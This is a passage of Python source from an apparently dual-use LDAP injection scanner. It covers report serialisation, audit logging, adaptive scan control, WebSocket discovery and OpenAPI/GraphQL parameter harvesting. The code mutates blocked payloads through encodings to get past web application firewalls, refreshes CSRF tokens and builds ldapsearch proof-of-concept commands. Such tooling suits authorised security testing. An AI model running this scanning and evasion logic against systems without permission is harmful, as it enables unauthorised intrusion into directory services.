        """Serialize one HandoffFinding to the V12 enterprise JSON format."""
        ev = f.exploiter_context or {}
        extracted = ev.get("extracted_values", {})
        impact    = ev.get("impact", {})

        # Build details block
        details: Dict[str, Any] = {
            "method":           f.http_method,
            "param_location":   "body" if f.http_method == "POST" else "query",
            "payload":          f.payload_raw,
            "payload_encoding": f.payload_encoding,
            "payload_tier":     f.payload_tier,
            "detection_method": f.payload_technique,
            "detection_signals":f.detection_signals,
            "diff_ratio":       round(f.diff_ratio, 4),
            "baseline_class":   f.baseline_response_class,
            "injected_class":   f.injected_response_class,
            "baseline_time_ms": None,
            "response_time_ms": (
                round(f.timing_delta_ms, 1) if f.timing_delta_ms else None),
            "timing_zscore":    f.timing_zscore,
            "oob_triggered":    f.oob_triggered,
            "waf_detected":     f.waf_detected,
            "waf_name":         f.framework_detected,
            "survived_metacharacters": f.survived_metacharacters,
            "raw_request":      f.raw_http_request[:1000] if f.raw_http_request else "",
            "raw_response":     (f.ldap_error_snippet or "")[:500],
            "alternative_payloads": f.alternative_payloads,
            "verification_steps": f.verification_steps,
            "second_order":     f.second_order,
            "auth_state":       f.auth_state,
            "cvss_vector":      f.cvss_vector,
            "cvss_score":       f.cvss_score,
            "lockout_risk":     f.lockout_risk,
        }

        if extracted:
            details["extracted_data"] = {
                "type":             "ldap_attribute_extraction",
                "attributes":       list(extracted.keys()),
                "preview":          {k: str(v)[:100] for k, v in extracted.items()},
                "full_content_saved": False,
            }
        if f.affected_ldap_attributes:
            details["affected_ldap_attributes"] = f.affected_ldap_attributes

        impact_block: Dict[str, Any] = {
            "scenario":    f.impact_scenario,
            "type":        f.impact_type,
            "blast_radius":f.blast_radius,
            "attack_chain":f.attack_chain,
        }

        return {
            "id":               f.finding_id,
            "scan_id":          f.scan_id,
            "agent_group":      "agent_detection",
            "sub_agent":        "LDAPInjectionDetector",
            "vulnerability_type": f.payload_technique,
            "category":         self._technique_to_category(f.payload_technique),
            "severity":         self._norm_sev(f.severity),
            "confidence":       self._norm_conf(f.reproduction_confidence),
            "confidence_score": f.reproduction_confidence,
            "verification_grade": f.verification_grade,
            "target_url":       f.endpoint_url,
            "affected_parameter": f.parameter_name,
            "timestamp":        f.timestamp,
            "description":      self._build_description(f),
            "observation":      self._build_observation(f),
            "proof_of_concept": f.curl_poc,
            "remediation":      (f.remediation_guidance or
                                 "Sanitize LDAP inputs; use parameterized directory queries; "
                                 "enforce input whitelisting on all directory-backed parameters."),
            "cve_reference":    None,
            "severity_reason":  f.severity_reason,
            "impact":           impact_block,
            "retest_steps":     f.retest_steps,
            "behavioral_signals": f.behavioral_signals,
            "function_class":   f.function_class,
            "mutation_chain":   f.mutation_chain_used,
            "schema_enumerated":f.schema_enumerated,
            "details":          details,
        }

    def _raw_ldap_to_v12(self, f: "RawLDAPFinding") -> Dict:
        poc = (
            f"ldapsearch -x -H ldap://{f.host}:{f.port} "
            f"-D '{f.bind_dn}' -w '***' -b '' -s base '(objectClass=*)'"
            if f.bind_dn else
            f"ldapsearch -x -H ldap://{f.host}:{f.port} "
            f"-b '' -s base '(objectClass=*)'"
        )
        return {
            "id":               finding_id(),
            "scan_id":          self._cfg.scan_id,
            "agent_group":      "agent_detection",
            "sub_agent":        "LDAPDirectTester",
            "vulnerability_type": f.finding_type,
            "category":         "direct_ldap_exposure",
            "severity":         f.severity.name.lower(),
            "confidence":       "high",
            "confidence_score": 95,
            "verification_grade": "CONFIRMED",
            "target_url":       f"ldap://{f.host}:{f.port}",
            "affected_parameter": "LDAP_BIND",
            "timestamp":        now_iso(),
            "description":      (
                f"Direct LDAP protocol vulnerability: {f.finding_type} on "
                f"{f.host}:{f.port}. Server type: {f.server_type}."),
            "observation":      f.evidence[:500] if f.evidence else "",
            "proof_of_concept": poc,
            "remediation":      (
                "Disable anonymous LDAP binds; enforce strong credentials; "
                "restrict LDAP port exposure; enable TLS (LDAPS)."),
            "cve_reference":    None,
            "details": {
                "host":        f.host,
                "port":        f.port,
                "server_type": f.server_type,
                "bind_dn":     f.bind_dn,
                "rootdse_data": f.rootdse_data,
            },
        }

    def emit(
        self,
        handoff:         "ScanHandoff",
        web_findings:    List["HandoffFinding"],
        raw_findings:    List["RawLDAPFinding"],
        start_time:      "datetime",
    ) -> str:
        """V12 — Emit structured JSON in enterprise format."""
        os.makedirs(self._cfg.output_dir, exist_ok=True)

        all_findings: List[Dict] = []
        errors:       List[str]  = []

        for i, f in enumerate(web_findings):
            try:
                all_findings.append(self._finding_to_v12(f, i + 1))
            except Exception as exc:
                errors.append(f"finding_serialize:{f.finding_id}:{exc}")

        for rf in raw_findings:
            try:
                all_findings.append(self._raw_ldap_to_v12(rf))
            except Exception as exc:
                errors.append(f"raw_ldap_serialize:{rf.host}:{exc}")

        # Sort by severity order
        _sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        all_findings.sort(key=lambda x: _sev_order.get(x.get("severity","medium"), 2))

        confirmed = [f for f in all_findings
                     if f.get("verification_grade") == "CONFIRMED"]
        probable  = [f for f in all_findings
                     if f.get("verification_grade") == "PROBABLE"]

        duration = (datetime.now(timezone.utc) - start_time).total_seconds()

        doc = {
            "status":     "completed",
            "errors":     errors,
            "gap_reason": None,

            "scan_metadata": {
                "schema_version":   "12.0",
                "tool":             f"{TOOL_NAME} v{VERSION}",
                "scan_id":          self._cfg.scan_id,
                "target":           self._cfg.target,
                "timestamp_start":  handoff.timestamp_start,
                "timestamp_end":    handoff.timestamp_end or now_iso(),
                "duration_seconds": round(duration, 2),
                "total_requests":   handoff.total_requests,
                "budget_mode":      handoff.budget_mode,
                "auth_tested":      handoff.auth_tested,
            },

            "target_profile": {
                "ldap_server_type":         handoff.ldap_server_type,
                "framework_detected":       handoff.framework_detected,
                "waf_detected":             handoff.waf_detected,
                "waf_name":                 handoff.waf_name,
                "waf_confidence":           handoff.waf_confidence,
                "survived_metacharacters":  handoff.survived_metacharacters,
                "raw_ldap_ports_open":      handoff.raw_ldap_ports_open,
                "target_live":              handoff.target_live,
                "dns_resolved":             handoff.target_dns_resolved,
                "open_ports":               handoff.target_ports_open,
            },

            "discovery": {
                "endpoints_discovered": handoff.endpoints_discovered,
                "endpoints_scanned":    handoff.endpoints_scanned,
                "unauth_tested":        handoff.unauth_endpoints_tested,
                "auth_tested":          handoff.auth_endpoints_tested,
                "openapi_specs":        handoff.openapi_specs_found,
                "graphql_endpoints":    handoff.graphql_endpoints_found,
                "websocket_endpoints":  handoff.websocket_endpoints_found,
            },

            "summary": {
                "total_findings":     len(all_findings),
                "confirmed":          len(confirmed),
                "probable":           len(probable),
                "candidates":         len(all_findings) - len(confirmed) - len(probable),
                "raw_ldap_findings":  len(raw_findings),
                "signals_fired":      handoff.signals_fired,
                "fp_filtered":        handoff.fp_filtered,
                "total_cvss_score":   round(handoff.total_cvss_score, 2),
                "cross_correlations": len(getattr(handoff, "cross_endpoint_correlations", [])),
            },

            "adaptive_intel": {
                "control_plane":  handoff.control_plane_summary,
                "adaptive_delay": handoff.adaptive_delay_applied,
                "mutations_effective": handoff.mutation_chains_effective,
            },

            "cross_endpoint_correlations": getattr(
                handoff, "cross_endpoint_correlations", []),

            "inconclusive_findings": handoff.inconclusive_findings,

            "findings": all_findings,
        }

        out_path = os.path.join(self._cfg.output_dir, self._cfg.findings_file)
        with open(out_path, "w", encoding="utf-8") as fh:
            json.dump(doc, fh, indent=2, default=str)

        return out_path


class ScanSessionLogger:
    """
    V12 — NDJSON audit trail with human-readable narrative.
    Every entry includes a 'narrative' field describing what happened
    in plain English, plus structured fields for machine ingestion.

    Adaptive depth: if the target was complex (many phase adjustments),
    includes multi-phase adjustment notes; simple scans get concise entries.
    """

    def __init__(self, cfg: ScanConfig):
        self._path = os.path.join(cfg.output_dir, cfg.audit_file)
        os.makedirs(cfg.output_dir, exist_ok=True)
        self._lock  = threading.Lock()
        self._seq   = 0
        self._current_request_id = threading.local()
        self._phase_adjustments: List[str] = []   # V12: track adaptive adjustments

    def _write(self, event: str, data: Dict,
               narrative: str = "",
               request_id: Optional[str] = None) -> None:
        rid = (request_id
               or getattr(self._current_request_id, 'id', None)
               or "default")
        entry = {
            "ts":         now_iso(),
            "seq":        self._seq,
            "event":      event,
            "request_id": rid,
            "narrative":  narrative,
            **data,
        }
        try:
            with self._lock:
                self._seq += 1
                with open(self._path, "a", encoding="utf-8") as fh:
                    fh.write(json.dumps(entry, default=str) + "\n")
        except Exception:
            pass

    def set_request_id(self, request_id: str) -> None:
        self._current_request_id.id = request_id

    def gen_request_id(self) -> str:
        rid = "inj-{}".format(uuid.uuid4().hex[:12])
        self.set_request_id(rid)
        return rid

    def log_phase(self, phase: str,
                  details: Optional[Dict] = None,
                  request_id: Optional[str] = None) -> None:
        _narratives = {
            "intelligence":  "Phase 1 started: gathering target stack intelligence, WAF detection, LDAP port scanning.",
            "discovery":     "Phase 2 started: crawling application for endpoints, forms, API specs, SPA routes.",
            "behavioral_risk": "Phase 3 started: probing endpoints with behavioral risk analysis.",
            "baseline":      "Phase 4 baseline collection: recording normal response profiles for each endpoint.",
            "raw_ldap":      "Phase 4b: testing direct LDAP protocol exposure on discovered ports.",
            "injection":     "Phase 4 injection: running LDAP payload injection loops across all qualified endpoints.",
            "handoff":       "Phase 5 started: compiling final results, validating exploits, emitting report.",
        }
        narrative = _narratives.get(phase, f"Starting phase: {phase}.")
        self._write("PHASE_START",
                    {"phase": phase, **(details or {})},
                    narrative=narrative,
                    request_id=request_id)

    def log_phase_adjustment(self, adjustment: str) -> None:
        """V12: Record adaptive strategy change for audit narrative."""
        self._phase_adjustments.append(adjustment)
        self._write("ADAPTIVE_ADJUSTMENT",
                    {"adjustment": adjustment},
                    narrative=f"Strategy adapted: {adjustment}")

    def log_signal(self, ep_key: str, param: str,
                   payload: str, detectors: List[str],
                   score: float, request_id: Optional[str] = None) -> None:
        narrative = (
            f"Anomaly detected on parameter '{param}' at {ep_key}. "
            f"Payload: {payload[:60]!r}. "
            f"Detectors fired: {', '.join(detectors[:3])}. Score: {score:.1f}."
        )
        self._write("SIGNAL", {
            "ep_key":    ep_key,
            "param":     param,
            "payload":   payload[:80],
            "detectors": detectors,
            "score":     round(score, 3),
        }, narrative=narrative, request_id=request_id)

    def log_finding(self, f: "HandoffFinding",
                    request_id: Optional[str] = None) -> None:
        narrative = (
            f"Finding recorded [{f.verification_grade}]: {f.payload_technique} "
            f"on parameter '{f.parameter_name}' at {f.endpoint_url}. "
            f"Severity: {f.severity}. Confidence: {f.reproduction_confidence}%. "
            f"PoC: {f.curl_poc[:100]}"
        )
        self._write("FINDING", {
            "finding_id":        f.finding_id,
            "endpoint":          f.endpoint_url,
            "parameter":         f.parameter_name,
            "severity":          f.severity,
            "grade":             f.verification_grade,
            "confidence":        f.reproduction_confidence,
            "payload":           f.payload_raw[:80],
            "technique":         f.payload_technique,
            "auth_state":        f.auth_state,
            "detection_signals": f.detection_signals,
            "poc":               f.curl_poc[:200],
        }, narrative=narrative, request_id=request_id)

    def log_raw_ldap(self, f: "RawLDAPFinding") -> None:
        narrative = (
            f"Direct LDAP vulnerability confirmed: {f.finding_type} "
            f"on {f.host}:{f.port} ({f.server_type}). "
            f"Evidence: {str(f.evidence)[:100]}"
        )
        self._write("RAW_LDAP_FINDING", {
            "host":         f.host,
            "port":         f.port,
            "finding_type": f.finding_type,
            "severity":     f.severity.name,
            "server_type":  f.server_type,
        }, narrative=narrative)

    def log_fp_filtered(self, ep_key: str, param: str,
                        reason: str,
                        request_id: Optional[str] = None) -> None:
        narrative = (
            f"False-positive filtered: parameter '{param}' at {ep_key} "
            f"was eliminated. Reason: {reason[:100]}"
        )
        self._write("FP_FILTERED", {
            "ep_key": ep_key,
            "param":  param,
            "reason": reason[:120],
        }, narrative=narrative, request_id=request_id)

    def log_verification(self, ep_key: str, param: str,
                         grade: str, proof: List[str],
                         request_id: Optional[str] = None) -> None:
        narrative = (
            f"Verification result for '{param}' at {ep_key}: {grade}. "
            f"Proof steps: {'; '.join(proof[:2])}"
        )
        self._write("VERIFICATION", {
            "ep_key": ep_key,
            "param":  param,
            "grade":  grade,
            "proof":  proof,
        }, narrative=narrative, request_id=request_id)

    def log_exploit_validation(self, finding_id: str, grade: str,
                               confidence: int, notes: List[str]) -> None:
        """V12: Log exploit replay validation."""
        narrative = (
            f"Exploit validated [{finding_id[:8]}]: grade={grade}, "
            f"confidence={confidence}%. Notes: {'; '.join(notes[:2])}"
        )
        self._write("EXPLOIT_VALIDATION", {
            "finding_id": finding_id,
            "grade":      grade,
            "confidence": confidence,
            "notes":      notes,
        }, narrative=narrative)

    def log_error(self, context: str, error: str,
                  request_id: Optional[str] = None) -> None:
        narrative = f"Error in {context}: {error[:150]}"
        self._write("ERROR", {
            "context": context,
            "error":   error[:200],
        }, narrative=narrative, request_id=request_id)

    def write_summary_footer(self, handoff: "ScanHandoff") -> None:
        """V12: Write a human-readable summary footer to the audit log."""
        n_confirmed = len(handoff.confirmed_findings)
        n_probable  = len(handoff.probable_findings)
        narrative = (
            f"SCAN COMPLETE. Target: {handoff.target}. "
            f"Duration: {round(handoff.duration_seconds,1)}s. "
            f"Requests: {handoff.total_requests}. "
            f"Confirmed: {n_confirmed}. Probable: {n_probable}. "
            f"Adaptive adjustments made: {len(self._phase_adjustments)}: "
            f"{'; '.join(self._phase_adjustments[:5])}."
        )
        self._write("SCAN_COMPLETE", {
            "scan_id":            handoff.scan_id,
            "target":             handoff.target,
            "duration_seconds":   round(handoff.duration_seconds, 2),
            "total_requests":     handoff.total_requests,
            "confirmed":          n_confirmed,
            "probable":           n_probable,
            "phase_adjustments":  self._phase_adjustments,
        }, narrative=narrative)


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-A  CONTROL PLANE INTELLIGENCE — Adaptive Scan Brain
# ═══════════════════════════════════════════════════════════════════════════════

class ControlPlaneMemory:
    """
    Persistent scan-scoped memory. Tracks what worked, what failed,
    per endpoint and globally. Feeds all phases for adaptive behavior.
    """
    def __init__(self):
        self._lock               = threading.Lock()
        # payload_raw → (success_count, fail_count, waf_blocked)
        self._payload_outcomes:  Dict[str, List[int]] = defaultdict(lambda: [0, 0, 0])
        # encoding_name → success_count
        self._encoding_scores:   Dict[str, int]       = defaultdict(int)
        # endpoint_url → {"rate_limited": bool, "instability": float}
        self._endpoint_states:   Dict[str, Dict]      = defaultdict(dict)
        # Which params produced signals per endpoint
        self._param_signals:     Dict[str, Set[str]]  = defaultdict(set)
        # Stack + WAF context
        self.framework:          str                  = "generic"
        self.waf_name:           Optional[str]        = None
        self.stack_hints:        Dict[str, Any]       = {}
        # Session tokens (CSRF / auth)
        self._csrf_map:          Dict[str, str]       = {}
        self._auth_tokens:       Dict[str, str]       = {}
        # Global scan health
        self.total_rate_limits:  int                  = 0
        self.consecutive_blocks: int                  = 0
        self.adaptive_delay:     float                = 0.0
        # Cross-endpoint storage markers (for second-order)
        self._stored_markers:    List[Dict]           = []

    # ── Payload feedback ──────────────────────────────────────────────────────

    def record_payload(self, raw: str, success: bool, waf_blocked: bool = False) -> None:
        with self._lock:
            o = self._payload_outcomes[raw[:60]]
            if success:          o[0] += 1
            elif waf_blocked:    o[2] += 1
            else:                o[1] += 1

    def top_encodings(self, n: int = 3) -> List[str]:
        with self._lock:
            ranked = sorted(self._encoding_scores.items(),
                            key=lambda x: x[1], reverse=True)
            return [k for k, _ in ranked[:n]]

    def record_encoding(self, name: str, success: bool) -> None:
        with self._lock:
            self._encoding_scores[name] += (2 if success else -1)

    def best_payloads(self, n: int = 5) -> List[str]:
        with self._lock:
            scored = {
                k: v[0] - v[1] * 0.5
                for k, v in self._payload_outcomes.items()
            }
            return [k for k, _ in sorted(scored.items(),
                    key=lambda x: x[1], reverse=True)[:n]]

    # ── Rate limit & throttle ─────────────────────────────────────────────────

    def record_rate_limit(self, url: str) -> float:
        """Record a rate-limit hit; return recommended delay."""
        with self._lock:
            self._endpoint_states[url]["rate_limited"] = True
            self.total_rate_limits  += 1
            self.consecutive_blocks += 1
            # Exponential back-off capped at 15s
            self.adaptive_delay = min(
                0.5 * (2 ** min(self.consecutive_blocks, 5)), 15.0)
            return self.adaptive_delay

    def record_success(self, url: str) -> None:
        with self._lock:
            self.consecutive_blocks = max(0, self.consecutive_blocks - 1)
            self.adaptive_delay     = max(0.0, self.adaptive_delay * 0.8)

    def is_rate_limited(self, url: str) -> bool:
        with self._lock:
            return self._endpoint_states.get(url, {}).get("rate_limited", False)

    # ── CSRF / Session ────────────────────────────────────────────────────────

    def update_csrf(self, url: str, token: str) -> None:
        with self._lock:
            self._csrf_map[url] = token

    def get_csrf(self, url: str) -> Optional[str]:
        with self._lock:
            return self._csrf_map.get(url)

    # ── Cross-endpoint marker tracking ───────────────────────────────────────

    def record_stored_marker(self, store_url: str, param: str, marker: str) -> None:
        with self._lock:
            self._stored_markers.append({
                "store_url": store_url, "param": param,
                "marker": marker, "ts": now_iso()
            })

    def get_stored_markers(self) -> List[Dict]:
        with self._lock:
            return list(self._stored_markers)

    # ── Param signal tracking ─────────────────────────────────────────────────

    def record_param_signal(self, endpoint_url: str, param: str) -> None:
        with self._lock:
            self._param_signals[endpoint_url].add(param)

    def get_signaling_params(self, endpoint_url: str) -> Set[str]:
        with self._lock:
            return set(self._param_signals.get(endpoint_url, set()))


class ControlPlaneIntelligence:
    """
    V8 — The adaptive control layer governing the entire scan.

    Implements the enterprise-grade "sense → think → act → persist" loop:
      Sense:   Monitor every response for timing, WAF blocks, rate limits
      Think:   Maintain evolving memory of what worked / failed
      Act:     Throttle, mutate payloads, re-authenticate, adapt strategy
      Persist: Tag endpoints with learned context for smarter retries

    All phases call into this layer for dynamic decision-making.
    """

    def __init__(self, cfg: "ScanConfig", client: "HTTPClient"):
        self._cfg    = cfg
        self._client = client
        self.memory  = ControlPlaneMemory()
        self._lock   = threading.Lock()

    # ── Phase adaptation ──────────────────────────────────────────────────────

    def on_waf_detected(self, waf_name: str, survived: Set[str]) -> None:
        """Called when WAF fingerprinting finishes. Adapts global strategy."""
        self.memory.waf_name  = waf_name
        info(f"[CP] WAF '{waf_name}' detected — enabling deep payload mutation")
        # Prefer char-encoded payloads over raw if WAF is aggressive
        if len(survived) < 4:
            self.memory.record_encoding("char_encode", True)
            self.memory.record_encoding("double_url", True)

    def on_framework_detected(self, framework: str, confidence: int) -> None:
        """Called after Phase 1 stack detection."""
        self.memory.framework = framework
        self.memory.stack_hints["framework"] = framework
        self.memory.stack_hints["confidence"] = confidence

    def on_rate_limit(self, url: str) -> None:
        """Called whenever a rate-limit is detected. Returns sleep suggestion."""
        delay = self.memory.record_rate_limit(url)
        warn(f"[CP] Rate limit on {url} — backing off {delay:.1f}s")
        time.sleep(delay)

    def on_request_success(self, url: str) -> None:
        self.memory.record_success(url)

    # ── Adaptive delay ────────────────────────────────────────────────────────

    def inter_request_delay(self) -> float:
        """Compute inter-request delay based on scan health."""
        base  = 1.0 / max(self._cfg.rps, 0.1)
        extra = self.memory.adaptive_delay
        jitter = random.uniform(0.0, base * 0.3)
        return base + extra + jitter

    # ── CSRF / Token refresh ──────────────────────────────────────────────────

    def refresh_csrf(self, ep: "Endpoint") -> Optional[str]:
        """Fetch fresh CSRF token for an endpoint."""
        try:
            resp = self._client.get(ep.url, phase="tier0")
            if resp is None:
                return None
            # Parse CSRF from response
            for pattern in [
                r'name=["\'](?:csrf|_csrf|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken)["\'][^>]*value=["\']([^"\']{10,})["\']',
                r'value=["\']([^"\']{20,})["\'][^>]*name=["\'](?:csrf|_csrf|token)["\']',
                r'"csrfToken"\s*:\s*"([^"]{10,})"',
            ]:
                m = re.search(pattern, resp.text or "", re.I)
                if m:
                    token = m.group(1)
                    self.memory.update_csrf(ep.url, token)
                    return token
        except Exception:
            pass
        return None

    # ── Session re-validation ─────────────────────────────────────────────────

    def validate_session(self) -> bool:
        """Re-authenticate if session has expired."""
        if not self._cfg.auth_url:
            return False
        try:
            probe_resp = self._client.get(self._cfg.target, phase="tier0")
            if probe_resp and AUTH_FAIL_RE.search(probe_resp.text or ""):
                warn("[CP] Session expired — re-authenticating...")
                return self._client.authenticate()
        except Exception:
            pass
        return True

    # ── Payload evolution ─────────────────────────────────────────────────────

    def evolve_payload(self, payload: "Payload", waf_blocked: bool) -> "Payload":
        """
        When a payload is WAF-blocked, evolve it using the best known
        encoding strategy from memory.
        """
        if not waf_blocked:
            self.memory.record_payload(payload.raw, success=True)
            return payload

        self.memory.record_payload(payload.raw, success=False, waf_blocked=True)

        top_encs = self.memory.top_encodings()
        mutator  = PayloadEngine.Mutator()

        enc_map = {
            "char_encode":   mutator.char_encode,
            "double_url":    mutator.double_url_encode,
            "hex_upper":     mutator.hex_upper_encode,
            "null_truncate": mutator.null_truncate,
            "html_entity":   mutator.html_entity_encode,
        }
        for enc_name in (top_encs or ["char_encode", "double_url"]):
            fn = enc_map.get(enc_name)
            if fn:
                try:
                    new_raw = fn(payload.raw)
                    evolved = copy.copy(payload)
                    evolved.raw = new_raw
                    evolved.encoded_already = True
                    vprint(f"[CP] Evolved payload via {enc_name}")
                    return evolved
                except Exception:
                    continue
        return payload

    # ── Phase outcome feedback ────────────────────────────────────────────────

    def phase_feedback(self, phase: str, outcome: Dict[str, Any]) -> None:
        """
        Phases call this to report outcomes. Control plane adjusts
        subsequent phase strategies accordingly.
        """
        if phase == "phase3" and outcome.get("high_risk_params"):
            # If Phase 3 found specific high-risk params, boost their injection budget
            info(f"[CP] Phase 3 → {len(outcome['high_risk_params'])} high-risk params — "
                 f"boosting injection priority")
        elif phase == "phase4" and outcome.get("confirmed_count", 0) > 0:
            # Active signal confirmed → unlock emergency budget
            info(f"[CP] Phase 4 → {outcome['confirmed_count']} confirmed — "
                 f"emergency budget unlocked")


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-B  WEBSOCKET PROBE — WS Endpoint Discovery
# ═══════════════════════════════════════════════════════════════════════════════

class WebSocketProbe:
    """
    V8 — Detects WebSocket endpoints from JS files and HTTP responses.
    Adds discovered WS endpoints to the scan queue with WS-specific params.
    """

    _WS_URL_RE = re.compile(
        r"""(?:new\s+WebSocket|io\.connect|socket\.connect|SockJS)\s*\(\s*[`'"](wss?://[^`'"]+)[`'"]""",
        re.I,
    )
    _WS_PATH_RE = re.compile(
        r"""[`'"](\/(?:ws|socket\.io|sockjs|websocket|realtime|live)[^`'"?#\s]{0,100})[`'"]""",
        re.I,
    )
    _WS_PARAM_HINTS_RE = re.compile(
        r"""\.(?:emit|send|subscribe)\s*\(\s*[`'"]([^`'"]+)[`'"]""",
        re.I,
    )

    def __init__(self, cfg: "ScanConfig", client: "HTTPClient"):
        self._cfg    = cfg
        self._client = client
        self._target = cfg.target.rstrip("/")

    def _extract_ws_from_js(self, js_url: str) -> List["Endpoint"]:
        eps: List["Endpoint"] = []
        try:
            resp = self._client.get(js_url, phase="discovery")
            if resp is None:
                return eps
            src = resp.text or ""
            # Full WS URLs
            for m in self._WS_URL_RE.finditer(src):
                ws_url = m.group(1)
                eps.append(self._make_ws_ep(ws_url))
            # Path-relative WS
            parsed = urlparse(self._target)
            base_ws = f"{'wss' if parsed.scheme == 'https' else 'ws'}://{parsed.netloc}"
            for m in self._WS_PATH_RE.finditer(src):
                path  = m.group(1)
                ws_url = base_ws + path
                # Collect parameter hints from .emit/.send calls
                params = [pm.group(1) for pm in self._WS_PARAM_HINTS_RE.finditer(src)]
                eps.append(self._make_ws_ep(ws_url, params[:8]))
        except Exception:
            pass
        return eps

    def _make_ws_ep(self, ws_url: str, params: Optional[List[str]] = None) -> "Endpoint":
        return Endpoint(
            url    = ws_url,
            method = "WS",
            params = params or ["message", "data", "query", "filter",
                                 "username", "search"],
            source = "websocket",
            auth_state = AuthState.UNAUTH,
            ldap_prob  = 25,
        )

    def probe(self, pages_html: List[str], js_urls: List[str]) -> List["Endpoint"]:
        """
        Scan collected HTML pages and JS files for WebSocket endpoints.
        Returns list of Endpoint objects with method='WS'.
        """
        eps:  List["Endpoint"] = []
        seen: Set[str]         = set()

        # From HTML pages
        for html in pages_html:
            for m in self._WS_URL_RE.finditer(html):
                ws_url = m.group(1)
                if ws_url not in seen:
                    seen.add(ws_url)
                    eps.append(self._make_ws_ep(ws_url))
            # WS paths
            parsed = urlparse(self._target)
            base_ws = f"{'wss' if parsed.scheme == 'https' else 'ws'}://{parsed.netloc}"
            for m in self._WS_PATH_RE.finditer(html):
                ws_url = base_ws + m.group(1)
                if ws_url not in seen:
                    seen.add(ws_url)
                    eps.append(self._make_ws_ep(ws_url))

        # From JS files
        for js_url in js_urls:
            for ep in self._extract_ws_from_js(js_url):
                if ep.url not in seen:
                    seen.add(ep.url)
                    eps.append(ep)

        if eps:
            info(f"  [WS] Discovered {len(eps)} WebSocket endpoint(s)")
        return eps


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-C  RECURSIVE PARAMETER DISCOVERY — Nested JSON + Array Expansion
# ═══════════════════════════════════════════════════════════════════════════════

class RecursiveParameterDiscovery:
    """
    V8 — Discovers nested JSON parameters and array inputs missed by
    form-based crawling.

    Strategies:
      1. Send empty JSON body → parse error messages for field names
      2. Send JSON with type-probing values → infer schema from validation errors
      3. Expand discovered dict keys recursively (max depth 3)
      4. Detect array params via common naming patterns
      5. Parse OpenAPI / GraphQL schemas for parameter lists
    """

    _FIELD_ERR_RE = re.compile(
        r"""['"](?:field|param|key|property|attribute)['"]\s*[:\s]+['"]([a-zA-Z_][a-zA-Z0-9_]{1,40})['"]""",
        re.I,
    )
    _GRAPHQL_VAR_RE = re.compile(
        r"""\$([a-zA-Z_][a-zA-Z0-9_]{1,40})\s*:\s*\w""",
    )
    _OPENAPI_PARAM_RE = re.compile(
        r'''"name"\s*:\s*"([a-zA-Z_][a-zA-Z0-9_]{1,40})"''',
    )

    def __init__(self, cfg: "ScanConfig", client: "HTTPClient"):
        self._cfg    = cfg
        self._client = client

    def _probe_json_endpoint(self, ep: "Endpoint") -> Set[str]:
        """Send empty + malformed JSON to harvest field names from errors."""
        found: Set[str] = set()
        for body in [{}, {"_probe": True}, {"a": None, "b": ""}]:
            try:
                resp = self._client.post(
                    ep.url, json_body=body,
                    auth_state=ep.auth_state,
                    phase="discovery",
                )
                if resp is None:
                    continue
                text = resp.text or ""
                for m in self._FIELD_ERR_RE.finditer(text):
                    found.add(m.group(1))
                # JSON validation errors often list required fields
                try:
                    j = resp.json()
                    for key in ("required", "fields", "missing", "errors"):
                        val = j.get(key) if isinstance(j, dict) else None
                        if isinstance(val, list):
                            for item in val:
                                if isinstance(item, str) and re.match(r'^[a-zA-Z_]\w{0,39}$', item):
                                    found.add(item)
                        elif isinstance(val, dict):
                            found.update(val.keys())
                except Exception:
                    pass
            except Exception:
                pass
        return found

    def _parse_openapi(self, spec_url: str) -> List[str]:
        """Fetch and parse OpenAPI spec for parameter names."""
        params: List[str] = []
        try:
            resp = self._client.get(spec_url, phase="discovery")
            if resp is None:
                return params
            for m in self._OPENAPI_PARAM_RE.finditer(resp.text or ""):
                params.append(m.group(1))
        except Exception:
            pass
        return params

    def _parse_graphql_introspection(self, gql_url: str) -> List[str]:
        """Run minimal GraphQL introspection to harvest field names."""
        params: List[str] = []
        query = '{"query":"{ __schema { types { name fields { name } } } }"}'
        try:
            resp = self._client.post(
                gql_url,
                json_body=json.loads(query),
                phase="discovery",
            )
            if resp is None:
                return params
            data = resp.json() if resp else {}
            # Walk types → fields
            for typ in (data.get("data", {})
                            .get("__schema", {})
                            .get("types", [])):
                for f in (typ.get("fields") or []):
                    name = f.get("name", "")
                    if name and not name.startswith("__"):
                        params.append(name)
        except Exception:
            pass
        return params

    def expand_endpoint(self, ep: "Endpoint",
                        openapi_specs: List[str],
                        graphql_urls: List[str]) -> "Endpoint":
        """
        Expand an endpoint's parameter list with recursively discovered params.
        Returns a new Endpoint with augmented params list.
        """
        extra: Set[str] = set()

        # 1. JSON probe (if endpoint looks like API)
        if ep.use_json or "/api/" in ep.url.lower():
            extra.update(self._probe_json_endpoint(ep))

        # 2. OpenAPI specs
        for spec_url in openapi_specs:
            extra.update(self._parse_openapi(spec_url))

        # 3. GraphQL
        for gql_url in graphql_urls:
            extra.update(self._parse_graphql_introspection(gql_url))

        # 4. Array param naming: if "tags" found, add "tags[]", "tags[0]"
        array_extras: Set[str] = set()
        for p in list(extra) + ep.params:
            if re.search(r's$', p):  # plural → likely array
                array_extras.add(f"{p}[]")

        all_params = list(dict.fromkeys(ep.params + list(extra) + list(array_extras)))

        if len(all_params) > len(ep.params):
            ep2 = copy.copy(ep)
            ep2.params = all_params[:30]  # cap at 30
            return ep2
        return ep

    def discover_specs(self, pages: List[str],
                       client: "HTTPClient") -> Tuple[List[str], List[str]]:
        """
        Scan crawled pages for links to OpenAPI/GraphQL specs.
        Returns (openapi_urls, graphql_urls).
        """
        openapi: List[str] = []
        graphql: List[str] = []
        target  = self._cfg.target.rstrip("/")

        _OA_PATHS = [
            "/openapi.json", "/swagger.json", "/api-docs",
            "/api/openapi.json", "/api/swagger.json",
            "/v1/openapi.json", "/v2/api-docs", "/docs/openapi.json",
        ]
        _GQL_PATHS = ["/graphql", "/api/graphql", "/query", "/gql"]

        for path in _OA_PATHS:
            url = target + path
            try:
                r = client.get(url, phase="discovery")
                if r and r.status_code == 200 and "openapi" in (r.text or "").lower():
                    openapi.append(url)
            except Exception:
                pass

        for path in _GQL_PATHS:
            url = target + path
            try:
                r = client.get(url, phase="discovery")
                if r and r.status_code in (200, 400):
                    if "graphql" in (r.text or "").lower() or "__schema" in (r.text or ""):
                        graphql.append(url)
            except Exception:
                pass

        if openapi: info(f"  [RPD] OpenAPI specs: {openapi}")
